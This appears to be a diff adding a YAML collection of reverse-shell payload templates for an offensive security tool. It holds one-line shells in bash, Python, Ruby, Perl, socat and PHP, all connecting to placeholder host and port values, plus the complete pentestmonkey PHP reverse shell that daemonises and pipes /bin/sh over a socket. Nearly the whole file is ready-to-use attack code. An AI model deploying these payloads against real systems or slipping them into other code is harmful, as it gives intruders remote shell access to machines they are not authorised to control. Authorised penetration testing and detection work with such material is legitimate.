@@ -1,0 +1,136 @@
+# resources:
+# - https://gtfobins.github.io/#+reverse%20shell
+# - https://medium.com/@honze_net/reverse-shell-and-some-magic-39629ccd0e5c
+# - https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode
+
+bash:
+  devtcp: bash -i >& /dev/tcp/$HOST$/$PORT$ 0>&1
+
+python:
+  subproc: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$HOST$",$PORT$));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+  pty: python -c 'import socket, os, pty; s=socket.socket(); s.connect(("$HOST$", "$PORT$")); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn("/bin/sh")'
+
+ruby:
+  socket: ruby -rsocket -e'f=TCPSocket.open("$HOST$",$PORT$).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+perl:
+  connect: perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($PORT$,inet_aton($HOST$)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+socat:
+  # listener: socat file:$TTY,raw,echo=0 tcp-listen:$PORT$
+  a: socat tcp-connect:$HOST$:$PORT$ exec:/bin/sh,pty,stderr,setsid,sigint,sane
+
+php:
+  fsock: php -r '$sock=fsockopen("$HOST$",$PORT$);exec("/bin/sh -i <&3 >&3 2>&3");'
+  # https://github.com/pentestmonkey/php-reverse-shell
+  monkey: |
+    <?php
+    set_time_limit (0);
+    $ip = '$HOST$';
+    $port = $PORT$;
+    $chunk_size = 1400;
+    $write_a = null;
+    $error_a = null;
+    $shell = 'uname -a; w; id; /bin/sh -i';
+    $daemon = 0;
+    $debug = 0;
+
+    if (function_exists('pcntl_fork')) {
+            $pid = pcntl_fork();
+
+            if ($pid == -1) {
+                    printit("ERROR: Can't fork");
+                    exit(1);
+            }
+
+            if ($pid) {
+                    exit(0);
+            }
+
+            // Make the current process a session leader
+            // Will only succeed if we forked
+            if (posix_setsid() == -1) {
+                    printit("Error: Can't setsid()");
+                    exit(1);
+            }
+
+            $daemon = 1;
+    }
+
+    chdir("/");
+    umask(0);
+
+    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
+    if (!$sock) {
+            printit("$errstr ($errno)");
+            exit(1);
+    }
+
+    $descriptorspec = array(
+       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+       2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+    );
+
+    $process = proc_open($shell, $descriptorspec, $pipes);
+
+    if (!is_resource($process)) {
+            printit("ERROR: Can't spawn shell");
+            exit(1);
+    }
+
+    stream_set_blocking($pipes[0], 0);
+    stream_set_blocking($pipes[1], 0);
+    stream_set_blocking($pipes[2], 0);
+    stream_set_blocking($sock, 0);
+
+    printit("Successfully opened reverse shell to $ip:$port");
+
+    while (1) {
+            if (feof($sock)) {
+                    printit("ERROR: Shell connection terminated");
+                    break;
+            }
+
+            if (feof($pipes[1])) {
+                    printit("ERROR: Shell process terminated");
+                    break;
+            }
+
+            $read_a = array($sock, $pipes[1], $pipes[2]);
+            $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+            if (in_array($sock, $read_a)) {
+                    if ($debug) printit("SOCK READ");
+                    $input = fread($sock, $chunk_size);
+                    if ($debug) printit("SOCK: $input");
+                    fwrite($pipes[0], $input);
+            }
+
+            if (in_array($pipes[1], $read_a)) {
+                    if ($debug) printit("STDOUT READ");
+                    $input = fread($pipes[1], $chunk_size);
+                    if ($debug) printit("STDOUT: $input");
+                    fwrite($sock, $input);
+            }
+
+            if (in_array($pipes[2], $read_a)) {
+                    if ($debug) printit("STDERR READ");
+                    $input = fread($pipes[2], $chunk_size);
+                    if ($debug) printit("STDERR: $input");
+                    fwrite($sock, $input);
+            }
+    }
+
+    fclose($sock);
+    fclose($pipes[0]);
+    fclose($pipes[1]);
+    fclose($pipes[2]);
+    proc_close($process);
+
+    function printit ($string) {
+            if (!$daemon) {
+                    print "$string\n";
+            }
+    }
+    ?>
